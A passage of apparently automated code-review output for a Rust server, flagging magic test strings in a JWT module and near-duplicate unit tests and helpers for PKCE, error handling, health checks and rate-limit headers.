#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 425

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 446

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 464

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 481

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 498

---

#### Magic value 'b"wrong-secret"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 505

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 531

---

#### Magic value '"write_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 532

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 549

---

#### Magic value '"admin"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 589

---

#### Magic value '"read"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 589

---

#### Magic value '"read_file"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 602

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 619

---

#### Magic value '"unknown:scope"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 623

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 639

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 659

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 695

---

#### Magic value '"user123"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 923

---

#### Magic value 'b"secret"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 930

---

#### Magic value '123' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/auth/jwt.rs`
- **Line:** 955

---

#### Magic value '"nested"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 961

---

#### Magic value '"value"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 961

---

#### Magic value '"valid"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 997

---

#### Magic value '123' passed as function argument (high). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/auth/jwt.rs`
- **Line:** 997

---

#### Magic value '"also_valid"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 997

---

#### Magic value '"keys"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 1017

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1268

**Code:**
```
    fn test_app_error_unauthorized() {
        let err = AppError::unauthorized("Invalid token");
        assert!(matches!(err.kind, AppErrorKind::Unauthorized(_)));
        assert!(!err.error_id.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1643

**Code:**
```
    fn test_add_rate_limit_headers() {
        use axum::body::Body;
        use crate::rate_limit::RateLimitResult;
        
        let mut response = Response::new(Body::empty());
        let rate_limit = RateLimitResult {
            allowed: true,
            limit: 100,
            remaining: 95,
            reset_at: 1700000000,
            retry_after_secs: None,
        };
        
        add_rate_limit_headers_from_result(&mut response, &rate_limit);
        
        assert_eq!(
            response.headers().get("x-ratelimit-limit").unwrap(),
            "100"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-remaining").unwrap(),
            "95"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-reset").unwrap(),
            "1700000000"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 100.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1801

**Code:**
```
    fn test_app_error_from_transport() {
        use crate::transport::TransportError;
        
        let err: AppError = TransportError::Timeout.into();
        assert!(matches!(err.kind, AppErrorKind::Transport(TransportError::Timeout)));
        
        let err: AppError = TransportError::ConnectionClosed.into();
        assert!(matches!(err.kind, AppErrorKind::Transport(TransportError::ConnectionClosed)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1583

**Code:**
```
    fn test_header_injector() {
        use opentelemetry::propagation::Injector;
        
        let mut headers = HeaderMap::new();
        {
            let mut injector = HeaderInjector(&mut headers);
            injector.set("x-trace-id", "12345".to_string());
        }
        
        assert_eq!(headers.get("x-trace-id").unwrap(), "12345");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 99.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1376

**Code:**
```
    fn test_pkce_consistency() {
        // Verify that verifier and challenge are correctly related
        use sha2::{Digest, Sha256};
        
        let (verifier, challenge) = generate_pkce();
        
        // Manually compute expected challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let hash = hasher.finalize();
        let expected_challenge = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            hash,
        );
        
        assert_eq!(challenge, expected_challenge);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1268

**Code:**
```
    fn test_app_error_unauthorized() {
        let err = AppError::unauthorized("Invalid token");
        assert!(matches!(err.kind, AppErrorKind::Unauthorized(_)));
        assert!(!err.error_id.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 98.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1596

**Code:**
```
    fn test_app_error_response_codes() {
        // Forbidden
        let err = AppError::forbidden("access denied");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        
        // Not Found
        let err = AppError::not_found("resource missing");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
        
        // Transport error
        let err = AppError::transport(crate::transport::TransportError::Timeout);
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::BAD_GATEWAY);
        
        // Internal
        let err = AppError::internal("boom");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1596

**Code:**
```
    fn test_app_error_response_codes() {
        // Forbidden
        let err = AppError::forbidden("access denied");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        
        // Not Found
        let err = AppError::not_found("resource missing");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
        
        // Transport error
        let err = AppError::transport(crate::transport::TransportError::Timeout);
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::BAD_GATEWAY);
        
        // Internal
        let err = AppError::internal("boom");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1561

**Code:**
```
    fn test_header_extractor() {
        let mut headers = HeaderMap::new();
        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
        
        let extractor = HeaderExtractor(&headers);
        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
        assert_eq!(extractor.get("missing"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1561

**Code:**
```
    fn test_header_extractor() {
        let mut headers = HeaderMap::new();
        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
        
        let extractor = HeaderExtractor(&headers);
        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
        assert_eq!(extractor.get("missing"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1561

**Code:**
```
    fn test_header_extractor() {
        let mut headers = HeaderMap::new();
        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
        
        let extractor = HeaderExtractor(&headers);
        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
        assert_eq!(extractor.get("missing"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.2% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1376

**Code:**
```
    fn test_pkce_consistency() {
        // Verify that verifier and challenge are correctly related
        use sha2::{Digest, Sha256};
        
        let (verifier, challenge) = generate_pkce();
        
        // Manually compute expected challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let hash = hasher.finalize();
        let expected_challenge = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            hash,
        );
        
        assert_eq!(challenge, expected_challenge);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 97.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1571

**Code:**
```
    fn test_header_extractor_keys() {
        let mut headers = HeaderMap::new();
        headers.insert("x-custom", HeaderValue::from_static("value"));
        headers.insert("content-type", HeaderValue::from_static("application/json"));
        
        let extractor = HeaderExtractor(&headers);
        let keys = extractor.keys();
        assert!(keys.contains(&"x-custom"));
        assert!(keys.contains(&"content-type"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1571

**Code:**
```
    fn test_header_extractor_keys() {
        let mut headers = HeaderMap::new();
        headers.insert("x-custom", HeaderValue::from_static("value"));
        headers.insert("content-type", HeaderValue::from_static("application/json"));
        
        let extractor = HeaderExtractor(&headers);
        let keys = extractor.keys();
        assert!(keys.contains(&"x-custom"));
        assert!(keys.contains(&"content-type"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1673

**Code:**
```
    fn test_add_rate_limit_headers_zero_remaining() {
        use axum::body::Body;
        use crate::rate_limit::RateLimitResult;
        
        let mut response = Response::new(Body::empty());
        let rate_limit = RateLimitResult {
            allowed: false,
            limit: 100,
            remaining: 0,
            reset_at: 1700000060,
            retry_after_secs: Some(60),
        };
        
        add_rate_limit_headers_from_result(&mut response, &rate_limit);
        
        assert_eq!(
            response.headers().get("x-ratelimit-remaining").unwrap(),
            "0"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1596

**Code:**
```
    fn test_app_error_response_codes() {
        // Forbidden
        let err = AppError::forbidden("access denied");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::FORBIDDEN);
        
        // Not Found
        let err = AppError::not_found("resource missing");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::NOT_FOUND);
        
        // Transport error
        let err = AppError::transport(crate::transport::TransportError::Timeout);
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::BAD_GATEWAY);
        
        // Internal
        let err = AppError::internal("boom");
        let resp = err.into_response();
        assert_eq!(resp.status(), StatusCode::INTERNAL_SERVER_ERROR);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1376

**Code:**
```
    fn test_pkce_consistency() {
        // Verify that verifier and challenge are correctly related
        use sha2::{Digest, Sha256};
        
        let (verifier, challenge) = generate_pkce();
        
        // Manually compute expected challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let hash = hasher.finalize();
        let expected_challenge = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            hash,
        );
        
        assert_eq!(challenge, expected_challenge);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 406

**Code:**
```
fn generate_random_string(len: usize) -> String {
    use base64::Engine;
    use rand::RngCore;
    use rand::rngs::OsRng;

    // Calculate bytes needed: base64 encodes 3 bytes to 4 chars
    // We need enough bytes to produce at least `len` characters
    // Manual div_ceil for MSRV 1.75 compatibility: (a + b - 1) / b
    let bytes_needed = (len * 3 + 4 - 1) / 4;
    let mut bytes = vec![0u8; bytes_needed];
    OsRng.fill_bytes(&mut bytes);

    // Encode with URL-safe base64 and truncate to desired length
    let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&bytes);
    encoded[..len].to_string()
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 96.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
